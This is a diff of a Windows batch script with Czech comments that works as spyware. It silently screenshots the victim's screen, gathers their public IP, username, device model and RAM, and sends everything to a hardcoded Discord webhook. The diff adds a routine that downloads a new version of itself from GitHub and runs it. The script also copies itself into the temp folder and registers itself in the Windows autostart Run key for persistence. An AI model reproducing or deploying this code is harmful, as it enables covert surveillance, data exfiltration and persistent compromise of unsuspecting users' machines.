@@ -2,31 +2,44 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
-:: ✅ NOVÝ Webhook URL
+:: 🌐 Webhook pro vše
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
-:: 📸 Screenshot přes PowerShell
+:: 🔁 GitHub RAW URL pro aktualizaci
+set "updateURL=https://raw.githubusercontent.com/fanysfanys00-ctrl/mc/refs/heads/main/takpojd.bat"
+set "localPath=%~f0"
+set "tempNew=%TEMP%\takpojd_new.bat"
+
+:: 📥 Stáhni novou verzi
+curl -s "%updateURL%" -o "%tempNew%"
+
+:: 🔍 Porovnej s aktuální verzí
+fc /b "%tempNew%" "%localPath%" >nul
+if errorlevel 1 (
+    echo 🔄 Nová verze detekována — aktualizuji...
+    copy /y "%tempNew%" "%localPath%" >nul
+    del /f /q "%tempNew%"
+    start "" "%localPath%"
+    exit
+)
+del /f /q "%tempNew%"
+
+:: 📸 Screenshot do TEMP
+set "ss=%TEMP%\screenshot_%RANDOM%.png"
 powershell -ExecutionPolicy Bypass -Command ^
-"Add-Type -AssemblyName System.Windows.Forms; ^
-Add-Type -AssemblyName System.Drawing; ^
-$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
-$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; ^
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap); ^
-$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); ^
-$path = \"$env:TEMP\screenshot.png\"; ^
-$bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)"
+  "Add-Type -AssemblyName System.Windows.Forms; ^
+   Add-Type -AssemblyName System.Drawing; ^
+   $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
+   $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
+   $graphics = [Drawing.Graphics]::FromImage($bmp); ^
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
+   $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
-:: 📤 Odeslání screenshotu
-curl -X POST %webhook% ^
-  -F "file=@%TEMP%\screenshot.png;type=image/png"
-del /f /q "%TEMP%\screenshot.png"
-
-:: ⏱️ Pauza 2 sekundy
-timeout /t 2 >nul
-
-:: 🌍 Získání systémových informací
+:: 🌍 Získání veřejné IP
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
 set "user=%USERNAME%"
+
+:: 🕒 Datum a čas
 for /f "tokens=1-4 delims=. " %%x in ("%date%") do (
     set "d1=%%x"
     set "d2=%%y"
@@ -59,37 +72,36 @@ set /a ram=%ramRaw:~0,-6%
 :: 🧾 Sestavení zprávy
 set "msg=🛰️ IP: ||!ip!||\nČas: !timestamp!\nUživatel: !user!\nZařízení: !deviceType!\nModel: !deviceModel!\nRAM: !ram! GB"
 
-:: 💾 Uložení zprávy do JSON a odeslání
-echo { > "%TEMP%\payload.json"
-echo   "content": "!msg!" >> "%TEMP%\payload.json"
-echo } >> "%TEMP%\payload.json"
+:: 💾 Uložení do JSON a odeslání
+set "payload=%TEMP%\payload.json"
+echo { > "!payload!"
+echo   "content": "!msg!" >> "!payload!"
+echo } >> "!payload!"
 
-curl -X POST %webhook% -H "Content-Type: application/json" --data "@%TEMP%\payload.json"
-del /f /q "%TEMP%\payload.json"
+curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
+del /f /q "!payload!"
 
-:: 🔁 Přesun sebe sama do %TEMP% pouze při prvním spuštění
+:: 📤 Odeslání screenshotu
+curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
+del /f /q "%ss%"
+
+:: 📦 Přesun do %TEMP% (jen při prvním spuštění)
 set "targetPath=%TEMP%\takpojd.bat"
-
-:: Pokud už jsme ve %TEMP%, přeskoč přesun
 echo %~dp0 | find /i "%TEMP%" >nul
-if not errorlevel 1 (
-    goto afterMove
-)
+if not errorlevel 1 goto afterMove
 
-:: 🛠️ Vytvoření pomocného skriptu pro přesun
+:: 🛠️ Pomocný skript pro přesun
 echo @echo off > "%TEMP%\movehelper.bat"
 echo timeout /t 2 ^>nul >> "%TEMP%\movehelper.bat"
 echo move /y "%~f0" "!targetPath!" ^>nul >> "%TEMP%\movehelper.bat"
 echo del "%%~f0" ^>nul >> "%TEMP%\movehelper.bat"
-
-:: ▶️ Spuštění pomocného skriptu
 start "" "%TEMP%\movehelper.bat"
 exit
 
 :afterMove
 
-:: 🔁 Registrace do autostartu
+:: 🔁 Autostart registrace
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG_SZ /d "!targetPath!" /f >nul
 
-:: ❌ Zavření všech CMD oken
-taskkill /f /im cmd.exe >nul 2>&1
+:: ✅ Hotovo
+exit
